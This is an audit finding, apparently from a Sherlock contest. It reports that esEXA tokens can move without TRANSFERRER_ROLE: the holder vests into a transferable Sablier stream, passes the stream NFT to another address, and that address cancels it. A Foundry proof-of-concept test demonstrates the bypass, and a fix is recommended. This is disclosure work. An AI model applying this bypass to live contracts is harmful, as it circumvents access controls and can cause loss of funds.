Recumbent Chartreuse Gazelle

medium

# Any address without TRANSFERRER_ROLE can transfer esEXA tokens.



## Summary
 
 Only addresses with TRANSFERRER_ROLE can transfer esEXA tokens but ANY address can transfer esEXA to another using a combination of `esEXA::vest`, `sablier::transferFrom` and `esEXA::cancel` because when vesting the `EscrowedEXA.sol` contract creates a sablier token stream with `transaferable=true` property by default.


## Vulnerability Detail

When a user vests esEXA tokens a sablier token stream is automatically created with the `transferable=true` property. If the user cancel right after initiating the vesting, the esEXA tokens are then transferred to the intended recipient. However, due to the stream's transferable nature, the recipient of the stream can be altered. Consequently, this new recipient can receive the esEXA tokens upon cancellation, thereby circumventing the controls established by the TRANSFERRER_ROLE.

### Attack path

Mark can transfer esEXA to Sam doing

1. Mark vest an amount of esEXA using `esEXA::Vest`
2. Mark just after vesting transfer the token stream to Sam using `sablier::transferFrom`
3. Sam now calls `esEXA::cancel` and get the esEXA token.

### Proof of Concept
Paste this POC to EscrowedEXA.t.sol

add import:

```javascript
import "forge-std/console2.sol";
```

```javascript

  function testTransferEsEXAWithoutTransferRole() external {
    uint256 amount = 1_000 ether;
    uint256 ratio = esEXA.reserveRatio();
    uint256 reserve = amount.mulWadDown(ratio);

    address sam = address(1001);
    address mark = address(1002);

    vm.label(sam, "sam");
    vm.label(mark, "mark");

    esEXA.mint(amount, sam);
    exa.transfer(sam, reserve);

    uint256[] memory streams = new uint256[](1);

    console2.log("EsEXA balance AFTER mark: %d , sam: %d", esEXA.balanceOf(mark), esEXA.balanceOf(sam));
    assertTrue(!esEXA.hasRole(esEXA.TRANSFERRER_ROLE(), mark));
    assertTrue(!esEXA.hasRole(esEXA.TRANSFERRER_ROLE(), sam));
    assertEq(esEXA.balanceOf(sam), amount);
    assertEq(esEXA.balanceOf(mark), 0);

    vm.startPrank(sam);
    exa.approve(address(esEXA), reserve);
    // mark will vest amount of esEXA
    streams[0] = esEXA.vest(uint128(amount), sam, ratio, esEXA.vestingPeriod());
    // Since the stream is set transferable when created and it is a NFT can be transfered to another person(mark).
    address(sablier).call(
                abi.encodeWithSignature("transferFrom(address,address,uint256)", sam, mark, streams[0])
            );
    vm.stopPrank();

    vm.prank(mark);
    
    // mark cancel the stream and get the esEXA. 
    esEXA.cancel(streams);

    console2.log("EsEXA balance BEFORE mark: %d , sam: %d", esEXA.balanceOf(mark), esEXA.balanceOf(sam));

    assertTrue(!esEXA.hasRole(esEXA.TRANSFERRER_ROLE(), mark));
    assertTrue(!esEXA.hasRole(esEXA.TRANSFERRER_ROLE(), sam));
    assertEq(esEXA.balanceOf(sam), 0);
    // Mark got the esEXA from sam without having TRANSFERRER_ROLE using a combination of esEXA::vest, sablier::transferFrom and esEXA::cancel
    assertEq(esEXA.balanceOf(mark), amount);

  }

```



## Impact
TRANSFERRER_ROLE Access Control bypass break important assumptions that protocol contracts do as the [exactly documentation says:](https://docs.exact.ly/governance/exactly-token-exa/escrowedexa-esexa)

`
The esEXA tokens are only transferable for accounts with a TRANSFERER_ROLE, reserved for the protocol contracts to integrate smoothly.
`
This design flaw could create security problems, operational problems or loss of funds to those protocol contracts that rely on the assumption that only accounts with  TRANSFERRER_ROLE  can transfer esEXA tokens

## Code Snippet

https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/periphery/EscrowedEXA.sol#L58-L62

https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/periphery/EscrowedEXA.sol#L96-L107


## Tool used

Manual Review

## Recommendation

Only addresses with TRANSFERRER_ROLE should create `transaferable=true` token stream and all others addresses should create non transferable stream.